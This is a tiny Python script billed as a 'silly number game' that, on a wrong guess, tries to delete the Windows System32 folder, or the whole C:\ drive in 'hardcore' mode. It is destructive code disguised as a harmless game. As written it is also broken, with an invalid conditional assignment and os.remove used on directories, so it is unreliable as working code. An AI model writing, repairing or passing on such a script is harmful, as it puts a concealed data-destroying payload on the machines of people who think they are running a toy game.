import os
import random

number = random.randint(1, 10)

print("Here's a silly number game!\n\n")

gamemode = input("Do you want to play hardcore gamemode? (Y/N): ")
directory = "C:\\Windows\\System32" if gamemode.lower() != "y" else directory = "C:\\"

guess = int(input("Guess number between 1 and 10"))

print("You Won!") if guess == number else os.remove(directory)
